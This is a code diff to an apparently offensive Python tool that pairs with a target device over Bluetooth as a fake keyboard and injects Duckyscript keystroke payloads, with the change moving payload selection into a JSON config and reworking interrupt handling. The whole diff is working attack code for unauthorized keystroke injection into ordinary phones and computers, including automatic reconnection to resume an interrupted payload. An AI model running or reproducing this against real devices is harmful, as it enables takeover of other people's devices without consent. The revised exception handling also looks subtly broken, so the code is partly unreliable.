@@ -3,9 +3,15 @@ from multiprocessing import Process
 from pydbus import SystemBus
 from enum import Enum
 import os
+import json
 
 from utils.menu_functions import (main_menu, read_duckyscript, run, restart_bluetooth_daemon, get_target_address)
 from utils.register_device import register_hid_profile, agent_loop
+
+installation = f'{os.getenv("HOME")}/.SuperSploit'
+with open(f"{installation}/.data/.config/data.json", 'r') as file:
+    di = json.load(file)
+    file.close()
 
 child_processes = []
 
@@ -631,79 +637,77 @@ def setup_and_connect(connection_manager, target_address, adapter_id):
 
 # Main function
 def main():
-    adapter_id = "hci0"
-    installation = f'{os.getenv("HOME")}/.SuperSploit/payloads'  # Specify the relative path to the payloads folder.
-    payloads = []
-    for i in os.listdir(installation):
-        if "Bluetooth" in i:
-            for x in os.listdir(f"{installation}/{i}"):
-                payloads.append(f"{installation}/{i}/{x}")
-
-    print("[*] Payloads loaded")
-    for z in payloads:
-        print(z)
-
-    input("Press enter to continue.")
-    main_menu()
-    target_address = get_target_address()
-
-    # exit clause
-    if not target_address:
-        log.info("No target address provided. Exiting.")
-        return
-
-    print("\nAvailable payloads:")
-    for idx, payload_file in enumerate(payloads, 1): # Check and enumerate the files inside the payload folder.
-        print(f"{idx}: {payload_file}")
-
-    payload_choice = input("\nEnter the number of the payload you want to load: ")
-    selected_payload = None
-
     try:
-        payload_index = int(payload_choice) - 1
-        selected_payload = payloads[payload_index]
-    except (ValueError, IndexError):
-        print("Invalid payload choice. No payload selected.")
+        adapter_id = "hci0"
+        installation = f'{os.getenv("HOME")}/.SuperSploit/payloads'  # Specify the relative path to the payloads folder.
+        payloads = []
+        for i in os.listdir(installation):
+            if "Bluetooth" in i:
+                for x in os.listdir(f"{installation}/{i}"):
+                    payloads.append(f"{installation}/{i}/{x}")
 
-    if selected_payload is not None:
-        print(f"Selected payload: {selected_payload}")
-        duckyscript = read_duckyscript(selected_payload)
-    else:
-        print("No payload selected.")
+        if input("[*] Would you like to see the payloads that are loaded: ").endswith("y"):
+            for z in payloads:
+                print(z)
 
-    
-    if not duckyscript:
-        log.info("Payload file not found. Exiting.")
-        return
+        main_menu()
+        target_address = get_target_address()
 
-    adapter = setup_bluetooth(target_address, adapter_id)
-    adapter.enable_ssp()
-    
-    current_line = 0
-    current_position = 0
-    connection_manager = L2CAPConnectionManager(target_address)
+        # exit clause
+        if not target_address:
+            log.info("No target address provided. Exiting.")
+            return
 
-    while True:
+        print("\nAvailable payloads:")
+        for idx, payload_file in enumerate(payloads, 1): # Check and enumerate the files inside the payload folder.
+            print(f"{idx}: {payload_file}")
+
+        selected_payload = None
+
         try:
-            hid_interrupt_client = setup_and_connect(connection_manager, target_address, adapter_id)
+            selected_payload = di["PAYLOAD"]
+        except (ValueError, IndexError):
+            print("Invalid payload choice. No payload selected.")
 
-            process_duckyscript(hid_interrupt_client, duckyscript, current_line, current_position)
-            time.sleep(2)
-            break  # Exit loop if successful
-        except ReconnectionRequiredException as e:
-            log.info("Reconnection required. Attempting to reconnect...")
-            current_line = e.current_line
-            current_position = e.current_position
-            connection_manager.close_all()
-            # Sleep before retrying to avoid rapid reconnection attempts
-            time.sleep(2)
-            
-    #process_duckyscript(hid_interrupt_client, duckyscript)
+        if selected_payload is not None:
+            print(f"Selected payload: {selected_payload}")
+            duckyscript = read_duckyscript(selected_payload)
+        else:
+            print("No payload selected.")
 
-if __name__ == "__main__":
+
+        if not duckyscript:
+            log.info("Payload file not found. Exiting.")
+            return
+
+        adapter = setup_bluetooth(target_address, adapter_id)
+        adapter.enable_ssp()
+
+        current_line = 0
+        current_position = 0
+        connection_manager = L2CAPConnectionManager(target_address)
+
+        while True:
+            try:
+                hid_interrupt_client = setup_and_connect(connection_manager, target_address, adapter_id)
+
+                process_duckyscript(hid_interrupt_client, duckyscript, current_line, current_position)
+                time.sleep(2)
+                break  # Exit loop if successful
+            except ReconnectionRequiredException as e:
+                log.info("Reconnection required. Attempting to reconnect...")
+                current_line = e.current_line
+                current_position = e.current_position
+                connection_manager.close_all()
+                # Sleep before retrying to avoid rapid reconnection attempts
+                time.sleep(2)
+
+    except KeyboardInterrupt:
+        return
+        #process_duckyscript(hid_interrupt_client, duckyscript)
+try:
     setup_logging()
     log = logging.getLogger(__name__)
-    try:
-        main()
-    finally:
-        terminate_child_processes()
+    main()
+except KeyboardInterrupt:
+    exit(0)
